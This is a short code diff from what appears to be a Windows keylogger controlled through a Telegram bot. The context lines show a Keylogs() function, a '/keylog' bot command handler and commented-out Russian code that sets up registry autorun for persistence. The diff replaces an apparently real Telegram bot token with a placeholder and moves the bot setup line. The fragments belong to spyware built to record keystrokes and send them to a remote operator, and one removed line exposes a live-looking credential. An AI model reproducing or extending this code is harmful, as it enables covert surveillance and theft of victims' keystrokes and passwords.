@@ -42,6 +42,11 @@ import win32con
 
 
 
+
+bot = telebot.TeleBot('YOUR TOKEN')
+
+
+
 # # Получаем путь к исполняемому файлу текущего скрипта
 # script_path = os.path.abspath(__file__)
 # # Создаем ключ реестра для автозагрузки
@@ -132,10 +137,6 @@ def Keylogs():
         logger = KeyLog()
         logger.main()
         # input()
-
-
-bot = telebot.TeleBot('6619437777:AAGAmak2lcgXlaJc1KniqJrpT2sjlSwXpIg')
-
 
 
 @bot.message_handler(commands=['keylog'])
